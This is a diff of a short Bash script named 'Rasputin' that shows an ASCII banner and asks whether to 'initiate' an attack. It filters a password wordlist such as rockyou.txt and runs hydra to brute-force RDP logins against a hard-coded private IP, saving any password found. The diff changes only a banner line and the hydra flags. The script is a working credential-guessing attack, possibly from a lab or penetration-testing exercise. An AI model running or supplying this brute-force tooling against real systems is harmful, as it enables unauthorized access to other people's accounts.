@@ -28,13 +28,13 @@ echo "                                @@@@@@@ . @@@@@@@("
 echo "                                  *@@@@@.@@@@@"
 echo "                                     @@@.@@("
 echo "                                       *.   "
-echo " Rasputin Online!"
+echo "Rasputin Online!"
 echo -n "Do you want to initiate warsats? (yes/no): "; read Console
 if [ "$Console" = "yes" ]; then 
        echo  -n "Enter path/to/wordlist (/usr/share/wordlists/rockyou.txt): "; read path
 	cat "$path" | grep -E '^.{12,}' > passlist.txt
         echo -n "Enter possible user credentials: "; read users
-        sudo hydra -I -l "$users" -P passlist.txt -t 1 -F -V rdp://172.16.139.39 -o password
+        hydra -l "$users" -P passlist.txt -t 1 -F -V rdp://172.16.139.39 -o password
         exec "$0"
 elif [ "$Console" = "no" ]; then
         echo "Goodbye"
